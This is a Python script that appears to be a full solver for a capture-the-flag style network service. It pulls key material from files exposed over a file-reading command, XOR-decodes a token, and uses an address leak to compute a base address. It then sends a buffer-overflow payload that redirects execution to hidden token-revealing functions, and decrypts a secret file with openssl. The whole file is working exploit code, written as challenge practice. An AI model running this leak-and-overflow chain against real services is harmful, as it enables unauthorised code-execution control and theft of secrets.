#!/usr/bin/env python3
import os, re, socket, struct, tempfile, subprocess

HOST = os.environ.get("TARGET_HOST","127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT","1337"))

# -------------------- network helpers --------------------
def _connect():
    return socket.create_connection((HOST, PORT), timeout=3)

def _recv_until_quiet(s, idle=0.35):
    s.settimeout(idle)
    out = b""
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            break
    return out

def send_cmd(line: bytes, read_all=False):
    if isinstance(line, str):
        line = line.encode()
    s = _connect()
    s.sendall(line)
    out = _recv_until_quiet(s) if read_all else s.recv(4096)
    s.close()
    return out

def peek(path, binary=True):
    out = send_cmd(f"PEEKFILE {path}\n", read_all=True)
    if out.startswith(b"ERR"):
        raise RuntimeError(out.decode(errors="ignore"))
    if b"FILECONTENTS:" in out:
        out = out.split(b"FILECONTENTS:", 1)[1]
    if out.endswith(b"\n"):
        out = out[:-1]
    return out if binary else out.decode(errors="ignore")

# -------------------- Step 1: GETPUB + key --------------------
def getpub_blob():
    out = send_cmd("GETPUB\n", read_all=True).decode(errors="ignore")
    lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
    assert lines and lines[0].startswith("PUBBLOBLEN:"), f"Bad GETPUB header: {lines[:2]}"
    hex_lines = "".join(lines[1:])
    return bytes.fromhex(hex_lines)

def parse_secret_key_from_header(txt: str) -> bytes:
    def parse_array(name):
        m = re.search(rf"{name}\s*\[\]\s*=\s*\{{([^}}]+)\}};", txt, re.S)
        if not m:
            return []
        return [int(x,16) for x in re.findall(r"0x([0-9a-fA-F]{2})", m.group(1))]
    a = parse_array("part_a")
    b = parse_array("part_b")
    if not a or not b:
        raise RuntimeError("Failed to parse secret_parts.h")
    return bytes(a + b)

def step1_public():
    key = parse_secret_key_from_header(peek("secret_parts.h", binary=False))
    obf = getpub_blob()
    token = bytes([obf[i] ^ key[i % len(key)] for i in range(len(obf))]).decode()
    return token, key

# -------------------- Exploit helpers (Steps 2 & 3) --------------------
def parse_symbols() -> dict:
    txt = peek("symbols.txt", binary=False)
    out = {}
    for ln in txt.splitlines():
        ln = ln.strip()
        if not ln or ":" not in ln:
            continue
        k,v = ln.split(":",1)
        if v.startswith("0x"):
            out[k] = int(v,16)
    return out

def leak_dummy_addr() -> int:
    out = send_cmd("INFO\n", read_all=True).decode(errors="ignore")
    m = re.search(r"LEAK:(0x[0-9a-fA-F]+)", out)
    if not m:
        raise RuntimeError(f"No leak in INFO response: {out!r}")
    return int(m.group(1), 16)

def exploit_call(target_addr: int, overflow_off: int) -> str:
    payload = b"A" * overflow_off + struct.pack("<Q", target_addr)
    s = _connect()

    # UPLOAD\n + 4-byte length (network order) + payload, then CALL 0\n
    s.sendall(b"UPLOAD\n")
    s.sendall(struct.pack("!I", len(payload)))
    s.sendall(payload)
    s.sendall(b"CALL 0\n")

    out = _recv_until_quiet(s)
    s.close()
    return out.decode(errors="ignore")

def step2_encrypted_via_exploit(symbols: dict) -> str:
    leak = leak_dummy_addr()
    base = leak - symbols["dummy_handler"]
    tgt  = base + symbols["reveal_token2"]
    txt  = exploit_call(tgt, symbols["overflow_offset"])
    m = re.search(r"TOKEN2:(.+)", txt)
    if not m:
        raise RuntimeError(f"No encrypted token in exploit output: {txt!r}")
    return m.group(1).strip()

def step3_runtime_via_exploit(symbols: dict) -> str:
    leak = leak_dummy_addr()
    base = leak - symbols["dummy_handler"]
    tgt  = base + symbols["reveal_runtime_token"]
    txt  = exploit_call(tgt, symbols["overflow_offset"])
    m = re.search(r"RUNTIME_TOKEN:(.+)", txt)
    if not m:
        raise RuntimeError(f"No runtime token in exploit output: {txt!r}")
    return m.group(1).strip()

# -------------------- Step 4: decrypt the secret file --------------------
def step4_secret_file(key: bytes) -> str:
    enc = peek("token_secret_file.enc")
    with tempfile.TemporaryDirectory() as td:
        encp=os.path.join(td, "enc.bin")
        decp=os.path.join(td, "dec.txt")
        open(encp,"wb").write(enc)

        cmd = [
            "openssl","enc","-d","-aes-128-cbc","-salt",
            "-pass", f"pass:{key.hex()}",
            "-in", encp, "-out", decp,
        ]
        cp = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if cp.returncode != 0:
            raise RuntimeError(f"OpenSSL decryption failed: {cp.stderr.decode(errors='ignore')}")
        data = open(decp,"rb").read().decode(errors="ignore")
        return data.strip()

# -------------------- Orchestrate --------------------
def full_solve():
    public_token, key = step1_public()
    symbols = parse_symbols()

    encrypted_token = step2_encrypted_via_exploit(symbols)
    runtime_token = step3_runtime_via_exploit(symbols)
    secret_token = step4_secret_file(key)

    return {
        "public": public_token,
        "encrypted": encrypted_token,
        "runtime": runtime_token,
        "secret": secret_token,
        "key_hex": key.hex(),
    }

if __name__ == "__main__":
    res = full_solve()
    print("[+] Public token     :", res["public"])
    print("[+] Encrypted token  :", res["encrypted"])
    print("[+] Runtime token    :", res["runtime"])
    print("[+] Secret token     :", res["secret"])
    print("[+] Key (hex)        :", res["key_hex"])